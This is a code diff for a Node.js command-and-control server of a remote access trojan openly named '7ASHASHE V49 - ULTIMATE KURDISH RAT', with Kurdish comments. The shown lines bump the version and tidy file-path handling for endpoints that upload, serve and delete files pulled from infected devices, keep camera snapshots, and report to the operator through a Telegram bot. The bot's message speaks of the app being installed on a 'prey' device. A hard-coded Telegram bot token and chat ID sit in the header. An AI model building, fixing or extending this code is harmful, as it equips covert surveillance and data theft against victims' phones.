@@ -1,7 +1,7 @@
 // =====================================================
-// 7ASHASHE V48 - ULTIMATE KURDISH RAT
+// 7ASHASHE V49 - ULTIMATE KURDISH RAT
 // گەشەپێدەر: عەزازیل 7ASHASHE
-// وەشان: 48.0.0 - ULTIMATE FILE EDITION
+// وەشان: 49.0.0 - FIXED EDITION
 // توکن: 8745582802:AAEKDPD6hQSlw7cvFHgBnDdE5-NLf-sgRWU
 // چات ئایدی: 5578405082
 // پۆرت: 8080
@@ -16,7 +16,7 @@ const multer = require('multer');
 const bodyParser = require('body-parser');
 const axios = require('axios');
 const os = require('os');
-const fs = require('fs');
+const fs = require('fs'); // ← یەک جار
 const path = require('path');
 const crypto = require('crypto');
 const zlib = require('zlib');
@@ -38,7 +38,6 @@ const appClients = new Map();
 // 📁 ڕێکخستنی فایلەکان
 // =====================================================
 const upload = multer({ dest: 'uploadedFile/' });
-const fs = require('fs');
 
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
@@ -84,14 +83,14 @@ const CAM_SNAPSHOTS_DIR = path.join(DATA_DIR, 'cam_snapshots');
 // 🏠 لاپەڕەی سەرەکی
 // =====================================================
 app.get('/', function (req, res) {
-    res.send('<h1 align="center">🔴 7ASHASHE V48 - ULTIMATE KURDISH RAT</h1>');
+    res.send('<h1 align="center">🔴 7ASHASHE V49 - ULTIMATE KURDISH RAT</h1>');
 });
 
 // =====================================================
 // 📥 وەرگرتنی فایل
 // =====================================================
 app.get('/getFile/*', function (req, res) {
-    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
+    const filePath = path.join(UPLOAD_DIR, encodeURIComponent(req.params[0]));
     fs.stat(filePath, function(err, stat) {
         if(err == null) {
             res.sendFile(filePath);
@@ -108,7 +107,7 @@ app.get('/getFile/*', function (req, res) {
 // =====================================================
 app.get('/deleteFile/*', function (req, res) {
     const fileName = req.params[0];
-    const filePath = __dirname + '/uploadedFile/' + encodeURIComponent(req.params[0]);
+    const filePath = path.join(UPLOAD_DIR, encodeURIComponent(req.params[0]));
     fs.stat(filePath, function(err, stat) {
         if (err == null) {
             fs.unlink(filePath, (err) => {
@@ -137,8 +136,8 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     
     // گواستنەوەی فایل بە ناوی ڕاستەقینە
     fs.rename(
-        __dirname + '/uploadedFile/' + file_name, 
-        __dirname + '/uploadedFile/' + encodeURIComponent(name), 
+        path.join(UPLOAD_DIR, file_name),
+        path.join(UPLOAD_DIR, encodeURIComponent(name)),
         function(err) { 
             if (err) console.log('هەڵە: ' + err);
         }
@@ -704,7 +703,7 @@ appBot.on('message', (message) => {
     if (chatId == msgChatId) {
         if (message.text == '/start') {
             appBot.sendMessage(chatId,
-                '🔴 **7ASHASHE V48 - ULTIMATE KURDISH RAT**\n\n' +
+                '🔴 **7ASHASHE V49 - ULTIMATE KURDISH RAT**\n\n' +
                 '✅ **بەخێربێیت، عەزازیل 7ASHASHE!**\n\n' +
                 '• ئەگەر ئەپەکە لەسەر ئامێری نێچیر دامەزرابێت، چاوەڕێی پەیوەندی بکە\n\n' +
                 '• کاتێک پەیامی پەیوەندیت وەرگرت، ئامێرەکە ئامادەیە بۆ وەرگرتنی فەرمان\n\n' +
@@ -988,14 +987,14 @@ setInterval(function () {
 // =====================================================
 const PORT = process.env.PORT || 8080;
 appServer.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ 7ASHASHE V48 running on port ${PORT}`);
+    console.log(`✅ 7ASHASHE V49 running on port ${PORT}`);
     console.log(`🌐 http://localhost:${PORT}`);
     console.log(`🔥 ULTIMATE KURDISH RAT - عەزازیل 7ASHASHE`);
     
     appBot.sendMessage(chatId,
-        `🔴 **7ASHASHE V48 - ULTIMATE KURDISH RAT**\n\n` +
+        `🔴 **7ASHASHE V49 - ULTIMATE KURDISH RAT**\n\n` +
         `👑 **عەزازیل 7ASHASHE**\n` +
-        `📊 وەشان: 48.0.0\n` +
+        `📊 وەشان: 49.0.0\n` +
         `🌐 پۆرت: ${PORT}\n` +
         `📁 فۆڵدەری فایلەکان: /data\n` +
         `🔗 لینکی فایلەکان: /getFile/[ناوی فایل]\n` +
